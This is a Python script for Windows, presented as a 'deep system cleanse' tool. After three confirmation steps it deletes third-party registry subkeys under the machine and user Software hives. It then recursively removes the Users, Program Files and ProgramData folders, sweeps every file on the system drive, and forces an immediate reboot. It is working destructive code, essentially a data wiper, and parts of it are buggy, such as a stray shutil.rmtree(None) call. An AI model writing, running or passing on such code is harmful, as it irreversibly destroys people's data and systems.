import os
import sys
import ctypes
import subprocess
import time
import shutil
import winreg
import random
import string
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False
def purge_critical_registry_keys():
    """Attempts to recursively delete major software hives. Will fail on locked keys."""
    print("\n[PHASE 1] INITIATING REGISTRY PURGE PROTOCOL...")
    time.sleep(2)
    hives_to_purge = [
        (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE"),
        (winreg.HKEY_CURRENT_USER, r"Software")
    ]
    for hive, base_key_path in hives_to_purge:
        try:
            with winreg.OpenKey(hive, base_key_path) as base_key:
                i = 0
                while True:
                    try:
                        subkey_name = winreg.EnumKey(base_key, i)
                        if "Microsoft" not in subkey_name and "Classes" not in subkey_name:
                            print(f"[REG_PURGE] Terminating hive: {subkey_name}")
                            shutil.rmtree(None, onerror=None)
                            winreg.DeleteKeyEx(base_key, subkey_name)
                    except OSError:
                        i += 1
                        continue
                    except Exception as e:
                        print(f"[REG_PURGE] Failed on {subkey_name}: {e}")
                        i += 1
        except Exception as e:
            print(f"[REG_PURGE] Could not access base hive {base_key_path}: {e}")
def execute_system_disassembly():
    """The main destructive payload. Deletes files and then reboots."""
    system_drive = os.environ.get("SystemDrive", "C:")
    root_path = f"{system_drive}\\"
    critical_dirs = [
        os.path.join(root_path, "Users"),
        os.path.join(root_path, "Program Files"),
        os.path.join(root_path, "Program Files (x86)"),
        os.path.join(root_path, "ProgramData"),
        os.path.join(root_path, "PerfLogs"),
    ]
    print("\n[PHASE 2] EXECUTING FILE SYSTEM DISASSEMBLY...")
    time.sleep(2)
    print("          TARGETING USER PROFILES AND APPLICATIONS FIRST.\n")
    for path in critical_dirs:
        if os.path.exists(path):
            print(f"[DELETION] Targeting directory: {path}")
            try:
                shutil.rmtree(path, ignore_errors=True)
                print(f"[SUCCESS] Directory {path} and its contents have been purged.")
            except Exception as e:
                print(f"[ERROR] Could not fully purge {path}: {e}")
        else:
            print(f"[INFO] Directory not found, skipping: {path}")
    print("\n[PHASE 3] INITIATING ROOT SWEEP. THIS MAY CAUSE SYSTEM INSTABILITY.")
    time.sleep(3)
    for root, dirs, files in os.walk(root_path, topdown=False):
        for name in files:
            file_path = os.path.join(root, name)
            try:
                os.remove(file_path)
                print(f"[DELETE] {file_path}")
            except OSError:
                print(f"[LOCKED] {file_path}")
        for name in dirs:
            dir_path = os.path.join(root, name)
            try:
                os.rmdir(dir_path)
                print(f"[RMDIR] {dir_path}")
            except OSError:
                print(f"[LOCKED] {dir_path}")
    print("\n[FINAL PHASE] SYSTEM HAS BEEN NEUTERED. FORCING REBOOT IN 5 SECONDS.")
    time.sleep(5)
    subprocess.run(["shutdown", "/r", "/f", "/t", "0"], check=True)
def main_sequence_controller():
    if not is_admin():
        print("[FATAL] ADMINISTRATIVE PRIVILEGES ARE REQUIRED FOR THIS OPERATION.")
        sys.exit(1)
    print("=" * 80)
    print(" " * 20 + "!!! DEEP SYSTEM CLEANSE INITIATOR !!!")
    print("=" * 80)
    print("\n[EXTREME WARNING] YOU ARE ABOUT TO EXECUTE A SCRIPT THAT WILL DESTROY YOUR")
    print("                  CURRENT WINDOWS INSTALLATION AND DELETE ALL YOUR DATA.")
    print("\nTHIS SCRIPT DOES NOT REINSTALL WINDOWS. IT ONLY DESTROYS IT.")
    print("\n--- WHAT IT DOES & CHANGES ---")
    print("""
    [+] Replaces the Operating System: NO. It DESTROYS the OS. Reinstallation is YOUR job.
    [+] Formats the Target Drive: NO. It attempts to DELETE everything file-by-file.
    [+] Resets System Settings: YES, by deleting the registry and configuration files.
    [+] Removes Installed Programs: YES, by deleting the Program Files directories.
    [+] Clears System-Related Issues: YES, by making the system unusable.
    [*] System Files and Folders: It will ATTEMPT to delete them.
    [*] User Accounts: It will DELETE the C:\\Users directory, erasing all profiles.
    [*] Registry and System Configurations: It will ATTEMPT to delete them.
    [*] Drivers: It will DELETE them with the rest of the system files.
    [*] Data on the System Drive: IT WILL DELETE ALL OF IT.
    """)
    print("=" * 80)
    try:
        confirm1 = input("\n[CONFIRMATION 1/3] Acknowledge that this script ONLY DESTROYS and does NOT reinstall.\n"
                         "Type exactly 'I UNDERSTAND THIS IS DESTRUCTIVE' and press Enter: ")
        if confirm1.strip() != 'I UNDERSTAND THIS IS DESTRUCTIVE':
            print("\n[ABORTED] Incorrect confirmation. Sequence terminated without action.")
            sys.exit(0)
        print("\n[STATUS] First-stage confirmation accepted. Prepare for final authorization.")
        time.sleep(2)
        auth_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        confirm2 = input(f"[CONFIRMATION 2/3] This is your final chance to turn back.\n"
                         f"To proceed, type the unique code: {auth_code}\nYour input: ")
        if confirm2.strip() != auth_code:
            print("\n[ABORTED] Authorization code mismatch. Sequence terminated without action.")
            sys.exit(0)
        print("\n[LOCKED IN] Second-stage confirmation accepted. DESTRUCTION IS IMMINENT.")
        print("=" * 80)
        print("           INITIATING FINAL COUNTDOWN. PRESS CTRL+C TO ABORT.")
        print("=" * 80)
        for i in range(10, 0, -1):
            print(f"                       PAYLOAD DEPLOYMENT IN T-{i:02d}...", end='\r')
            time.sleep(1)
        print("\n\n[CONFIRMATION 3/3] COUNTDOWN COMPLETE. GOODBYE.")
    except KeyboardInterrupt:
        print("\n\n[ABORTED] User manually terminated the sequence. Your system is safe.")
        sys.exit(0)
    purge_critical_registry_keys()
    execute_system_disassembly()
if __name__ == "__main__":
    main_sequence_controller()